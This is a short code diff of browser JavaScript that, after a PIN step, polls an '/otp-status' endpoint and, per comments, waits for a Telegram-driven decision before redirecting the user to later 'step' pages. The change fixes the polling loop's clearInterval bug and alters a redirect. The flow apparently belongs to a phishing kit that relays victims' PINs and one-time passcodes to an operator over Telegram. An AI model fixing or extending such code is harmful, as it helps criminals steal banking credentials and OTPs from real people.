@@ -41,7 +41,7 @@ if (localStorage.getItem("firstProcess") === "yes") {
 // ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
 if (localStorage.getItem("fromPin") === "yes") {
 
-  setInterval(async () => {
+  const interval = setInterval(async () => {
     try {
         const res = await fetch("/otp-status");
         const data = await res.json();
@@ -51,13 +51,13 @@ if (localStorage.getItem("fromPin") === "yes") {
         // 🔥 FORCE CHECK (handles string + number)
         if (data.otp == 5) {
     localStorage.removeItem("fromPin");
-    clearInterval(this);
-    window.location.href = "step5.html";
+    clearInterval(interval);
+    window.location.href = "step6.html";
 }
 
         if (data.otp == 6) {
     localStorage.removeItem("fromPin");
-    clearInterval(this); // stop loop
+    clearInterval(interval); // stop loop
     window.location.href = "step6.html";
 }
 
